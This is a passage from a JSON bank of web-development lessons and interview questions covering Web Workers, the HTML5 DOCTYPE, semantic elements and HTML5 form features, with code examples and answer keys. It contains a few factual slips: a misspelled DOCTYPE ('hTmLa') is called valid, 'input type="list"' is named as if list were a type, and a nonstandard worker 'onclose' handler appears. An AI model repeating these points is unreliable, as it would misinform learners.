          ]
        }
      ]
    }
  },
  {
    "id": "6c987e9c-e1c8-4cf9-a05c-752a9c9f3df6",
    "startLine": 11400,
    "endLine": 11499,
    "processedDate": "2025-06-17T12:25:27.974Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_web_workers_intro",
          "title": "Introduction to Web Workers",
          "content": "Web Workers provide a way to run scripts in background threads, separate from the main execution thread of a web page. This allows for long-running scripts to execute without blocking the user interface (UI), ensuring a smooth and responsive user experience. They are particularly useful for performing computationally intensive tasks such as complex calculations, data processing, or large network requests.\n\n## Key Concepts\n- **Background Execution:** Workers run on a separate thread, preventing UI freezing.\n- **No DOM Access:** Web Workers do not have direct access to the DOM (Document Object Model) of the main page. All interactions with the UI must be done by sending messages to the main thread.\n- **Communication:** Communication between the main thread and a worker thread is done via message passing using the `postMessage()` method and handling messages with the `onmessage` event handler.\n- **Dedicated Workers:** The most common type, dedicated to a single script. Each worker has its own global scope.\n- **Shared Workers:** Can be accessed by multiple scripts from different windows, iframes, or even other workers, provided they are from the same origin.\n- **Service Workers:** Used for intercepting network requests, caching assets, and enabling offline experiences. (Not covered in detail here but important for context).\n\n## Worker Life Cycle\n1.  **Creation:** A `Worker` object is created in the main thread, referencing the worker script.\n2.  **Communication:** Messages are sent using `postMessage()` and received via `onmessage`.\n3.  **Termination:** A worker can be terminated from the main thread using `worker.terminate()` or from within the worker itself using `self.close()`.\n\n## Limitations\n- Cannot directly manipulate the DOM.\n- Cannot access global variables or functions defined on the main page.\n- Restricted access to certain browser APIs (e.g., `alert()`, `confirm()`, `document`, `window`).\n\n## Performance Benefits\nBy offloading heavy computations to a worker thread, the main thread remains free to handle UI updates, user input, and other critical tasks, leading to a more fluid and responsive application.",
          "examples": [
            {
              "id": "example_web_workers_1",
              "title": "Main Thread Script (index.js)",
              "code": "// index.js (main thread)\n\n// Check if Web Workers are supported\nif (window.Worker) {\n  const myWorker = new Worker('worker.js');\n\n  // Send data to the worker\n  myWorker.postMessage('Start calculation');\n  console.log('Message sent to worker');\n\n  // Listen for messages from the worker\n  myWorker.onmessage = function(event) {\n    console.log('Received from worker:', event.data);\n    // Update UI based on worker's result (e.g., display result)\n    const resultElement = document.getElementById('result');\n    if (resultElement) {\n      resultElement.textContent = 'Worker says: ' + event.data;\n    }\n  };\n\n  // Handle errors from the worker\n  myWorker.onerror = function(error) {\n    console.error('Worker error:', error);\n  };\n\n  // Example of terminating the worker after some time\n  setTimeout(() => {\n    myWorker.terminate();\n    console.log('Worker terminated.');\n  }, 5000);\n} else {\n  console.log('Web Workers are not supported in this browser.');\n}",
              "explanation": "This JavaScript code runs in the main browser thread. It creates a new `Worker` instance, loads `worker.js`, sends an initial message, and sets up an `onmessage` handler to receive results back. It also demonstrates error handling and termination.",
              "language": "javascript"
            },
            {
              "id": "example_web_workers_2",
              "title": "Worker Script (worker.js)",
              "code": "// worker.js\n\nself.onmessage = function(event) {\n  console.log('Received from main thread in worker:', event.data);\n  // Perform a heavy calculation (e.g., Fibonacci)\n  const calculateFibonacci = (n) => {\n    if (n <= 1) return n;\n    return calculateFibonacci(n - 1) + calculateFibonacci(n - 2);\n  };\n\n  const result = calculateFibonacci(40); // A moderately heavy calculation\n\n  // Send data back to the main thread\n  self.postMessage('Calculation complete! Result: ' + result);\n};\n\n// Handle errors from the worker itself\nself.onerror = function(error) {\n  console.error('Error within worker:', error);\n};\n\n// Optional: respond to termination\nself.onclose = function() {\n  console.log('Worker is about to be terminated.');\n};",
              "explanation": "This script runs in the worker thread. It listens for messages from the main thread using `self.onmessage`, performs a long-running computation (like calculating a Fibonacci number), and then sends the result back to the main thread using `self.postMessage()`. `self` refers to the global scope of the worker.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_web_workers_1",
            "question_web_workers_2",
            "question_web_workers_3",
            "question_web_workers_4"
          ],
          "relatedTasks": [
            "task_web_worker_fibonacci"
          ],
          "tags": [
            "JavaScript",
            "Web Workers",
            "Concurrency",
            "Performance",
            "Frontend Architecture"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "javascript_basics",
            "event_loop"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "advanced",
          "requiredFor": [
            "performance_optimization",
            "complex_ui_architecture"
          ]
        },
        {
          "id": "theory_html5_doctype",
          "title": "HTML5 DOCTYPE Declaration",
          "content": "The `<!DOCTYPE html>` declaration is an essential component of any modern HTML document. It's not an HTML tag itself, but rather an instruction to the web browser. Its primary purpose is to inform the browser about the version of HTML the document is written in, enabling the browser to render the page in the most appropriate mode.\n\n## Key Points about DOCTYPE\n- **Instruction to the Browser:** It tells the browser which document type definition (DTD) to use, which in turn dictates how the page should be parsed and rendered.\n- **HTML5 Simplification:** In HTML5, the DOCTYPE declaration is drastically simplified compared to older HTML versions (like HTML 4.01 Strict, Transitional, or XHTML 1.0). The single `<!DOCTYPE html>` declaration is all that's needed for HTML5.\n- **Standards Mode Activation:** The `<!DOCTYPE html>` declaration triggers 'standards mode' in all modern browsers. In standards mode, browsers attempt to render the page according to the W3C (World Wide Web Consortium) specifications, leading to consistent rendering across different browsers.\n- **Quirks Mode Prevention:** Without a proper DOCTYPE, or with an invalid one, browsers might switch to 'quirks mode' (also known as 'backward-compatible mode'). In quirks mode, browsers try to emulate the behavior of older, non-standard browsers (e.g., Netscape 4 or Internet Explorer 5). This can lead to inconsistent layout, styling, and JavaScript behavior across different browsers and even different versions of the same browser, making development and debugging challenging.\n- **Placement:** It *must* appear at the very beginning of the HTML document, before the `<html>` tag, any comments, or any other content.\n- **Case Insensitivity:** In HTML5, the DOCTYPE declaration is case-insensitive, meaning `<!DOCTYPE html>`, `<!doctype html>`, or `<!DoCtYpE hTmLa>` are all valid. However, `<!DOCTYPE html>` is the widely adopted and recommended convention.\n\n## Why it Matters\nUsing the correct DOCTYPE ensures that your web pages are rendered consistently and predictably across different browsers, adhering to modern web standards. This is crucial for cross-browser compatibility, maintaining layout integrity, and ensuring that CSS and JavaScript behave as expected.",
          "examples": [
            {
              "id": "example_html5_doctype_1",
              "title": "Correct HTML5 DOCTYPE Usage",
              "code": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>My HTML5 Page</title>\n    <link rel=\"stylesheet\" href=\"style.css\">\n</head>\n<body>\n    <h1>Welcome to HTML5!</h1>\n    <p>This page uses the correct HTML5 DOCTYPE.</p>\n</body>\n</html>",
              "explanation": "This example shows the correct placement and syntax for the HTML5 DOCTYPE declaration. It appears as the very first line of the document, ensuring the browser renders the page in standards mode.",
              "language": "html"
            },
            {
              "id": "example_html5_doctype_2",
              "title": "Impact of Missing DOCTYPE (Conceptual)",
              "code": "<!-- Example of a page that might trigger quirks mode -->\n<html>\n<head>\n    <title>Page without DOCTYPE</title>\n    <style>\n        body {\n            margin: 0; /* Might be ignored in quirks mode */\n            padding: 0;\n        }\n        div {\n            width: 100px; /* Box model differences */\n            height: 100px;\n            border: 1px solid black;\n            padding: 10px;\n            background-color: lightblue;\n        }\n    </style>\n</head>\n<body>\n    <div>Box content</div>\n</body>\n</html>",
              "explanation": "While not directly executable to show quirks mode, this conceptual example illustrates how a missing DOCTYPE could lead to browsers falling back to quirks mode. In quirks mode, CSS properties like `margin` or the box model (`width` and `height` calculations with padding/border) might behave differently than in standards mode, causing layout inconsistencies.",
              "language": "html"
            }
          ],
          "relatedQuestions": [
            "question_html5_doctype_1",
            "question_html5_doctype_2",
            "question_html5_doctype_3"
          ],
          "relatedTasks": [
            "task_html5_doctype_validation"
          ],
          "tags": [
            "HTML",
            "HTML5",
            "DOCTYPE",
            "Standards Mode",
            "Quirks Mode",
            "Browser Compatibility"
          ],
          "technology": "HTML",
          "prerequisites": [
            "html_structure"
          ],
          "complexity": 3,
          "interviewRelevance": 6,
          "learningPath": "beginner",
          "requiredFor": [
            "web_standards",
            "cross_browser_compatibility"
          ]
        },
        {
          "id": "theory_html5_semantic_elements",
          "title": "HTML5 Semantic Elements",
          "content": "HTML5 introduced a rich set of new semantic elements that provide more meaning and structure to web content beyond just layout. Semantic HTML means using HTML elements for their intended purpose, conveying the meaning and role of the content they enclose, rather than just how they appear visually.\n\n## Benefits of Semantic HTML\n-   **Accessibility:** Improves the experience for users with disabilities, as screen readers and other assistive technologies can better interpret the page structure.\n-   **SEO (Search Engine Optimization):** Search engines can better understand the content and hierarchy of your page, potentially leading to improved rankings.\n-   **Readability and Maintainability:** Makes the code easier for developers to read, understand, and maintain, especially in large projects.\n-   **Better Code Organization:** Encourages a more logical and structured approach to markup.\n\n## Key Semantic Elements\n\nHere are some of the most commonly used HTML5 semantic elements:\n\n-   **`<header>`:** Defines introductory content or a set of navigational links for a document or a section. It often contains headings, logos, authorship information, and navigation.\n\n-   **`<nav>`:** Defines a section of navigation links, either within the main site navigation or a sub-navigation.\n\n-   **`<main>`:** Represents the dominant content of the `<body>` of a document. There should only be one `<main>` element per document.\n\n-   **`<section>`:** Defines a standalone section within a document, which doesn't have a more specific semantic element to represent it. It typically has a heading.\n\n-   **`<article>`:** Defines independent, self-contained content that could be distributed and reused independently. Examples include a blog post, a news story, a forum post, or a user-submitted comment.\n\n-   **`<aside>`:** Defines content 'aside' from the content it is placed in, meaning it's related but tangential. This is often used for sidebars, pull quotes, or advertisements.\n\n-   **`<footer>`:** Defines a footer for its nearest sectioning content or for the entire document. It typically contains information about the author, copyright data, related documents, or links to terms of use.\n\n-   **`<figure>` and `<figcaption>`:**\n    -   **`<figure>`:** Specifies self-contained content, frequently an image, diagram, code snippet, or video, that is referenced from the main flow of the document.\n    -   **`<figcaption>`:** Provides a caption or legend for the content of its parent `<figure>` element.\n\n-   **`<details>` and `<summary>`:** (Not explicitly in original, but good to add for modern HTML5)\n    -   **`<details>`:** Creates a disclosure widget in which information is only visible when the widget is toggled into an 'open' state.\n    -   **`<summary>`:** Provides a summary or caption for the content of its parent `<details>` element.\n\nUsing these elements appropriately helps build web pages that are more meaningful not only to humans but also to machines.",
          "examples": [
            {
              "id": "example_html5_semantic_1",
              "title": "Basic Document Structure with Semantic Elements",
              "code": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Semantic HTML Example</title>\n</head>\n<body>\n\n    <header>\n        <h1>My Awesome Blog</h1>\n        <nav>\n            <ul>\n                <li><a href=\"/\">Home</a></li>\n                <li><a href=\"/about\">About</a></li>\n                <li><a href=\"/contact\">Contact</a></li>\n            </ul>\n        </nav>\n    </header>\n\n    <main>\n        <article>\n            <h2>Latest Blog Post</h2>\n            <p>Published on: <time datetime=\"2023-10-27\">October 27, 2023</time></p>\n            <section>\n                <h3>Introduction</h3>\n                <p>This is the introductory paragraph of the blog post...</p>\n            </section>\n            <section>\n                <h3>Main Content</h3>\n                <p>The main content of the article goes here. It can contain paragraphs, images, etc.</p>\n                <figure>\n                    <img src=\"/images/example.jpg\" alt=\"A beautiful landscape\">\n                    <figcaption>A scenic view from the mountains.</figcaption>\n                </figure>\n            </section>\n            <section>\n                <h3>Conclusion</h3>\n                <p>Concluding remarks for the blog post.</p>\n            </section>\n        </article>\n\n        <aside>\n            <h3>Related Articles</h3>\n            <ul>\n                <li><a href=\"#\">Article 1</a></li>\n                <li><a href=\"#\">Article 2</a></li>\n            </ul>\n        </aside>\n    </main>\n\n    <footer>\n        <p>&copy; 2023 My Awesome Blog</p>\n        <address>\n            Contact me at <a href=\"mailto:info@example.com\">info@example.com</a>\n        </address>\n    </footer>\n\n</body>\n</html>",
              "explanation": "This example demonstrates how semantic HTML5 elements are used to structure a typical blog page. `<header>`, `<nav>`, `<main>`, `<article>`, `<section>`, `<aside>`, `<footer>`, `<figure>`, and `<figcaption>` are all used according to their semantic meaning, providing clear context for the content.",
              "language": "html"
            }
          ],
          "relatedQuestions": [
            "question_html5_semantic_1",
            "question_html5_semantic_2",
            "question_html5_semantic_3",
            "question_html5_semantic_4"
          ],
          "relatedTasks": [
            "task_html5_semantic_refactor"
          ],
          "tags": [
            "HTML",
            "HTML5",
            "Semantic HTML",
            "Accessibility",
            "SEO",
            "Web Standards"
          ],
          "technology": "HTML",
          "prerequisites": [
            "html_basics",
            "dom_structure"
          ],
          "complexity": 5,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "requiredFor": [
            "accessible_web_development",
            "seo_friendly_websites"
          ]
        },
        {
          "id": "theory_html5_form_elements",
          "title": "HTML5 New Form Elements and Input Types",
          "content": "HTML5 significantly enhanced web forms by introducing a variety of new input types and elements, simplifying common form interactions and providing built-in validation capabilities. These additions reduce the need for custom JavaScript and improve user experience.\n\n## New Input Types\n\n-   **`<input type=\"date\">`**: Allows users to select a date. The browser often provides a calendar interface.\n-   **`<input type=\"time\">`**: Allows users to select a time.\n-   **`<input type=\"datetime-local\">`**: Combines date and time selection, without timezone information.\n-   **`<input type=\"month\">`**: Allows users to select a month and year.\n-   **`<input type=\"week\">`**: Allows users to select a week and year.\n\n-   **`<input type=\"number\">`**: For numerical input. Can be constrained with `min`, `max`, and `step` attributes.\n    -   `min`: Specifies the minimum allowed value.\n    -   `max`: Specifies the maximum allowed value.\n    -   `step`: Specifies the legal number intervals.\n\n-   **`<input type=\"range\">`**: Creates a slider control. Commonly used for selecting a value from a specified range. Also uses `min`, `max`, and `step`.\n\n-   **`<input type=\"color\">`**: Provides a color picker interface to select a color.\n\n-   **`<input type=\"email\">`**: For entering email addresses. Provides basic client-side validation for email format. Can also use `multiple` attribute.\n-   **`<input type=\"url\">`**: For entering URLs. Provides basic client-side validation for URL format.\n-   **`<input type=\"tel\">`**: For entering telephone numbers. No special validation, but often triggers numerical keyboard on mobile devices.\n-   **`<input type=\"search\">`**: For search fields. Often styled differently by browsers (e.g., with an 'x' to clear).\n\n## New Form Elements\n\n-   **`<datalist>`**: Provides a list of pre-defined options for an `<input>` element. It's not a dropdown list, but rather an autocomplete feature, where the user can choose from the suggestions or type their own value.\n    -   Used in conjunction with the `list` attribute on an `<input>` element.\n\nThese new types and elements enhance user interaction, improve data quality through built-in validation, and simplify form development.",
          "examples": [
            {
              "id": "example_html5_form_elements_1",
              "title": "Date and Time Inputs",
              "code": "<form>\n  <label for=\"birthdate\">Birthdate:</label>\n  <input type=\"date\" id=\"birthdate\" name=\"birthdate\">\n\n  <label for=\"appointment-time\">Appointment Time:</label>\n  <input type=\"time\" id=\"appointment-time\" name=\"appointment-time\">\n\n  <label for=\"event-datetime\">Event Date & Time:</label>\n  <input type=\"datetime-local\" id=\"event-datetime\" name=\"event-datetime\">\n\n  <label for=\"vacation-month\">Vacation Month:</label>\n  <input type=\"month\" id=\"vacation-month\" name=\"vacation-month\">\n\n  <label for=\"enrollment-week\">Enrollment Week:</label>\n  <input type=\"week\" id=\"enrollment-week\" name=\"enrollment-week\">\n</form>",
              "explanation": "This example showcases various date and time input types introduced in HTML5, allowing browsers to provide native UI controls for selection, enhancing user experience and data consistency.",
              "language": "html"
            },
            {
              "id": "example_html5_form_elements_2",
              "title": "Number, Range, Color, and Datalist Inputs",
              "code": "<form>\n  <label for=\"quantity\">Quantity (1-5):</label>\n  <input type=\"number\" id=\"quantity\" name=\"quantity\" min=\"1\" max=\"5\" value=\"1\">\n\n  <label for=\"volume\">Volume (0-100):</label>\n  <input type=\"range\" id=\"volume\" name=\"volume\" min=\"0\" max=\"100\" value=\"50\">\n\n  <label for=\"favcolor\">Favorite Color:</label>\n  <input type=\"color\" id=\"favcolor\" name=\"favcolor\" value=\"#ff0000\">\n\n  <label for=\"browser-choice\">Choose your browser:</label>\n  <input list=\"browsers\" id=\"browser-choice\" name=\"browser\">\n  <datalist id=\"browsers\">\n    <option value=\"Chrome\">\n    <option value=\"Firefox\">\n    <option value=\"Safari\">\n    <option value=\"Edge\">\n    <option value=\"Opera\">\n  </datalist>\n</form>",
              "explanation": "This example demonstrates `number` (with `min`/`max` constraints), `range` (a slider), `color` (a color picker), and the combination of `input type=\"list\"` with `<datalist>` for an autocomplete-like suggestion feature.",
              "language": "html"
            }
          ],
          "relatedQuestions": [
            "question_html5_form_elements_1",
            "question_html5_form_elements_2",
            "question_html5_form_elements_3"
          ],
          "relatedTasks": [
            "task_html5_complex_form"
          ],
          "tags": [
            "HTML",
            "HTML5",
            "Forms",
            "Input Types",
            "User Experience",
            "Client-side Validation"
          ],
          "technology": "HTML",
          "prerequisites": [
            "html_forms_basics"
          ],
          "complexity": 4,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "requiredFor": [
            "web_form_development",
            "frontend_forms"
          ]
        },
        {
          "id": "theory_html5_form_attributes",
          "title": "HTML5 New Form Attributes",
          "content": "In addition to new input types, HTML5 introduced several new attributes for form elements, enhancing their functionality, improving user experience, and providing more control over client-side validation and behavior.\n\n## Key Form Attributes\n\n-   **`placeholder`**: Provides a hint to the user about what kind of input is expected in the field. This text appears inside the input field when it's empty and disappears when the user starts typing.\n    ```html\n    <input type=\"text\" placeholder=\"Enter your name\">\n    ```\n\n-   **`autofocus`**: A boolean attribute. When present, it specifies that the input field should automatically get focus when the page loads. Only one element in a document can have the `autofocus` attribute.\n    ```html\n    <input type=\"text\" autofocus>\n    ```\n\n-   **`autocomplete`**: Controls whether the browser should provide autocomplete suggestions based on previously entered values. It can be set to `on` (default for most inputs) or `off` (to prevent autofill for sensitive data).\n    ```html\n    <input type=\"email\" autocomplete=\"off\">\n    ```\n\n-   **`required`**: A boolean attribute. When present, it specifies that the input field must be filled out before the form can be submitted. The browser will prevent submission and display an error message if the field is empty.\n    ```html\n    <input type=\"text\" required>\n    ```\n\n-   **`pattern`**: Specifies a regular expression pattern that the input's value must match for the form to be valid. The `title` attribute can be used to provide a descriptive tooltip to help the user understand the required format.\n    ```html\n    <input type=\"text\" pattern=\"[A-Za-z]{3}\" title=\"Three letter country code\">\n    ```\n\n-   **`list`**: Used on `<input>` elements. It references the `id` of a `<datalist>` element, providing a list of pre-defined options for an autocomplete-like functionality.\n    ```html\n    <input list=\"browsers\" name=\"browser\">\n    <datalist id=\"browsers\">\n      <option value=\"Chrome\">\n    </datalist>\n    ```\n\n-   **`multiple`**: A boolean attribute. When present, it allows the user to select multiple values. It's applicable to `<input type=\"email\">` (for multiple email addresses separated by commas) and `<input type=\"file\">` (for selecting multiple files).\n    ```html\n    <input type=\"email\" multiple>\n    <input type=\"file\" multiple>\n    ```\n\n-   **`novalidate`**: A boolean attribute. Applied to the `<form>` tag, it disables the browser's built-in validation for the entire form when submitted.\n    ```html\n    <form novalidate>\n      <!-- form elements -->\n    </form>\n    ```\n\n-   **`formnovalidate`**: A boolean attribute. Applied to a `submit` button (`<input type=\"submit\">` or `<button type=\"submit\">`), it disables browser validation specifically for that submit button, even if the form itself has client-side validation.\n    ```html\n    <input type=\"submit\" value=\"Submit\" formnovalidate>\n    ```\n\n-   **`form`**: Specifies one or more forms the input element belongs to. This attribute is useful when an input element is placed outside of its `<form>` element (e.g., in a separate part of the page layout).\n    ```html\n    <form id=\"myForm\">\n      <!-- other form elements -->\n    </form>\n    <input type=\"text\" name=\"username\" form=\"myForm\">\n    ```\n\nThese attributes provide powerful tools for creating more robust, user-friendly, and accessible forms with less JavaScript, relying on the browser's native capabilities.",
          "examples": [
            {
              "id": "example_html5_form_attributes_1",
              "title": "Validation Attributes",
              "code": "<form action=\"/submit-form\" method=\"post\">\n  <label for=\"username\">Username (3-10 chars, letters only):</label>\n  <input \n    type=\"text\" \n    id=\"username\" \n    name=\"username\" \n    placeholder=\"e.g., JohnDoe\" \n    pattern=\"[A-Za-z]{3,10}\" \n    title=\"Username must be 3-10 letters only\"\n    required\n  >\n  \n  <label for=\"email\">Email:</label>\n  <input type=\"email\" id=\"email\" name=\"email\" placeholder=\"your.email@example.com\" required multiple>\n\n  <label for=\"password\">Password:</label>\n  <input type=\"password\" id=\"password\" name=\"password\" required>\n\n  <button type=\"submit\">Register</button>\n  <button type=\"submit\" formnovalidate>Submit without validation</button>\n</form>",
              "explanation": "This example demonstrates `placeholder`, `pattern`, `title` (for `pattern` help), `required`, and `multiple` (for email input). It also shows `formnovalidate` on a specific submit button.",
              "language": "html"
            },
            {
              "id": "example_html5_form_attributes_2",
              "title": "Autofocus and External Input",
              "code": "<form id=\"contactForm\">\n  <label for=\"name\">Name:</label>\n  <input type=\"text\" id=\"name\" name=\"name\" autofocus required>\n\n  <label for=\"message\">Message:</label>\n  <textarea id=\"message\" name=\"message\"></textarea>\n\n  <input type=\"submit\" value=\"Send Message\">\n</form>\n\n<div style=\"margin-top: 20px; border: 1px dashed gray; padding: 10px;\">\n  <h3>Outside Form Input:</h3>\n  <label for=\"feedback-email\">Your Email (associated with contact form):</label>\n  <input type=\"email\" id=\"feedback-email\" name=\"feedbackEmail\" form=\"contactForm\" autocomplete=\"off\">\n</div>",
              "explanation": "This example illustrates `autofocus` which automatically focuses the 'Name' input on page load. It also shows the `form` attribute being used to associate an `input` element (`feedback-email`) located outside the `<form>` tag with the `contactForm`.",
              "language": "html"
            }
          ],
          "relatedQuestions": [
            "question_html5_form_attributes_1",
            "question_html5_form_attributes_2",
            "question_html5_form_attributes_3",
            "question_html5_form_attributes_4"
          ],
          "relatedTasks": [
            "task_html5_complex_form"
          ],
          "tags": [
            "HTML",
            "HTML5",
            "Forms",
            "Attributes",
            "Validation",
            "User Experience"
          ],
          "technology": "HTML",
          "prerequisites": [
            "html_forms_basics"
          ],
          "complexity": 5,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "web_form_development",
            "frontend_forms_validation"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_web_workers_1",
          "topic": "Web Workers Basics",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary benefit of using Web Workers?",
          "answer": "Web Workers allow JavaScript code to run in a background thread, separate from the main UI thread, preventing the web page from freezing during computationally intensive tasks.",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "Web Workers",
            "UI Thread",
            "Background Processing",
            "Performance"
          ],
          "evaluationCriteria": [
            "Understanding of core purpose",
            "Knowledge of performance implications"
          ],
          "example": "",
          "tags": [
            "JavaScript",
            "Web Workers",
            "Performance"
          ],
          "prerequisites": [
            "javascript_basics",
            "browser_execution_model"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_web_workers_2",
          "topic": "Web Workers Communication",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following methods is used to send data from the main thread to a Web Worker, and from the worker back to the main thread?",
          "answer": "postMessage()",
          "options": [
            "sendMessage()",
            "postMessage()",
            "transferMessage()",
            "dispatchMessage()"
          ],
          "analysisPoints": [
            "Recognizing the correct API for inter-thread communication in Web Workers.",
            "Understanding that `postMessage()` is bidirectional."
          ],
          "keyConcepts": [
            "Web Workers",
            "Message Passing",
            "postMessage"
          ],
          "evaluationCriteria": [
            "Correct identification of Web Worker communication method.",
            "Distinguishing from plausible but incorrect options."
          ],
          "example": "The `postMessage()` method sends a message to the worker. The worker then listens for this message using `self.onmessage`. Similarly, the worker uses `self.postMessage()` to send a message back to the main thread, which listens via `worker.onmessage`.",
          "tags": [
            "JavaScript",
            "Web Workers",
            "Communication"
          ],
          "prerequisites": [
            "web_workers_intro"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_web_workers_3",
          "topic": "Web Workers Limitations",
          "level": "medium",
          "type": "open",
          "question": "Can Web Workers directly access the DOM? If not, how do they interact with the web page's user interface?",
          "answer": "No, Web Workers cannot directly access the DOM (Document Object Model). They run in a separate thread and do not have access to the `document` or `window` objects of the main thread. To interact with the web page's user interface, Web Workers must communicate with the main thread using message passing. The worker sends data (e.g., results of a computation) to the main thread via `self.postMessage()`, and the main thread receives this data using an `onmessage` event handler. The main thread then updates the DOM based on the received data.",
          "analysisPoints": [
            "Correctly stating the limitation regarding DOM access.",
            "Explaining the mechanism of message passing (`postMessage` and `onmessage`) as the intermediary for UI interaction.",
            "Demonstrating understanding of the separation of concerns between worker and main threads."
          ],
          "keyConcepts": [
            "Web Workers",
            "DOM Access",
            "Message Passing",
            "Main Thread",
            "UI Updates"
          ],
          "evaluationCriteria": [
            "Accuracy of the limitation description.",
            "Clarity and completeness of the interaction mechanism explanation.",
            "Understanding of the architectural implications."
          ],
          "example": "",
          "tags": [
            "JavaScript",
            "Web Workers",
            "DOM",
            "Architecture",
            "Limitations"
          ],
          "prerequisites": [
            "web_workers_intro"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_web_workers_4",
          "topic": "Web Workers vs. Main Thread",
          "level": "hard",
          "type": "code",
          "question": "Consider a web application that needs to perform a very large calculation (e.g., processing a huge array of numbers) when a button is clicked. Describe the potential issues if this calculation is done directly on the main thread, and then write a conceptual code snippet demonstrating how to offload this task to a Web Worker, including communication.",
          "answer": "",
          "options": [],
          "analysisPoints": [
            "Identify UI freezing/unresponsiveness as the main issue on the main thread.",
            "Demonstrate correct Web Worker creation and lifecycle (`new Worker()`, `postMessage()`, `onmessage`, `terminate()`).",
            "Show message passing for input to the worker and results back to the main thread.",
            "Highlight separation of concerns between main and worker script contexts.",
            "Consider error handling and termination."
          ],
          "keyConcepts": [
            "Web Workers",
            "Main Thread Blocking",
            "Performance Optimization",
            "Message Passing",
            "UI Responsiveness"
          ],
          "evaluationCriteria": [
            "Ability to articulate performance bottlenecks.",
            "Correct implementation of Web Worker creation and communication.",
            "Demonstration of understanding worker thread context.",
            "Clarity of conceptual code."
          ],
          "example": "Potential issues on the main thread: If a large calculation is performed directly on the main thread, it will block the browser's UI thread. This means the page will become unresponsive: users won't be able to click buttons, scroll, or interact with any elements, and animations will freeze. The browser might even show a 'script unresponsive' warning.\n\n```javascript\n// index.html (excerpt)\n// <button id=\"calculateBtn\">Start Heavy Calculation</button>\n// <p id=\"status\">Status: Ready</p>\n\n// main.js (Main Thread Script)\nconst calculateBtn = document.getElementById('calculateBtn');\nconst statusParagraph = document.getElementById('status');\nlet worker = null;\n\ncalculateBtn.addEventListener('click', () => {\n  if (worker) {\n    worker.terminate(); // Terminate existing worker if any\n  }\n  worker = new Worker('heavy_calc_worker.js');\n  statusParagraph.textContent = 'Status: Calculation started...';\n  calculateBtn.disabled = true;\n\n  // Send data to the worker\n  const dataToSend = { iterations: 100000000 };\n  worker.postMessage(dataToSend);\n\n  worker.onmessage = (event) => {\n    console.log('Main thread received:', event.data);\n    statusParagraph.textContent = 'Status: ' + event.data.message + ' Result: ' + event.data.result;\n    calculateBtn.disabled = false;\n    worker.terminate(); // Terminate worker after receiving result\n    worker = null;\n  };\n\n  worker.onerror = (error) => {\n    console.error('Worker error in main thread:', error);\n    statusParagraph.textContent = 'Status: Error during calculation.';\n    calculateBtn.disabled = false;\n    if (worker) worker.terminate();\n    worker = null;\n  };\n});\n\n// heavy_calc_worker.js (Worker Thread Script)\nself.onmessage = function(event) {\n  const { iterations } = event.data;\n  console.log('Worker received task with iterations:', iterations);\n  \n  let sum = 0;\n  for (let i = 0; i < iterations; i++) {\n    sum += Math.sqrt(i);\n  }\n\n  self.postMessage({ message: 'Calculation finished!', result: sum });\n};\n\nself.onerror = function(error) {\n  console.error('Error within worker:', error);\n  self.postMessage({ message: 'Error in worker calculation.' });\n};\n```",
          "tags": [
            "JavaScript",
            "Web Workers",
            "Performance",
            "Concurrency",
            "Code Example"
          ],
          "prerequisites": [
            "web_workers_intro",
            "javascript_async"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_html5_doctype_1",
          "topic": "DOCTYPE Declaration",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the HTML5 DOCTYPE declaration?",
          "answer": "`<!DOCTYPE html>` is an instruction to the web browser that tells it the document is written in HTML5. It's not an HTML tag.",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "DOCTYPE",
            "HTML5",
            "Browser Instruction"
          ],
          "evaluationCriteria": [
            "Recall of definition",
            "Distinguishing from HTML tags"
          ],
          "example": "",
          "tags": [
            "HTML",
            "HTML5",
            "DOCTYPE"
          ],
          "prerequisites": [],
          "complexity": 2,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_html5_doctype_2",
          "topic": "Standards vs. Quirks Mode",
          "level": "medium",
          "type": "mcq",
          "question": "What is the primary benefit of including `<!DOCTYPE html>` at the beginning of your HTML document?",
          "answer": "It ensures the browser renders the page in 'standards mode', leading to consistent rendering across browsers.",
          "options": [
            "It speeds up page loading by pre-parsing HTML.",
            "It ensures the browser renders the page in 'standards mode', leading to consistent rendering across browsers.",
            "It defines the character encoding for the document.",
            "It enables JavaScript execution in the browser."
          ],
          "analysisPoints": [
            "Identifying the correct mode triggered by DOCTYPE.",
            "Understanding the impact on cross-browser consistency.",
            "Distinguishing from unrelated HTML functions (e.g., `charset`, script execution)."
          ],
          "keyConcepts": [
            "DOCTYPE",
            "Standards Mode",
            "Quirks Mode",
            "Browser Rendering",
            "Cross-browser Compatibility"
          ],
          "evaluationCriteria": [
            "Correct identification of DOCTYPE's role.",
            "Understanding of standards mode benefits."
          ],
          "example": "Without `<!DOCTYPE html>`, browsers might fall into 'quirks mode', which can cause unpredictable rendering behavior due to attempts to emulate older, non-standard browser interpretations. Standards mode, triggered by the DOCTYPE, makes browsers follow modern W3C specifications for consistent display.",
          "tags": [
            "HTML",
            "HTML5",
            "DOCTYPE",
            "Browser Rendering"
          ],
          "prerequisites": [
            "html5_doctype"
          ],
          "complexity": 4,
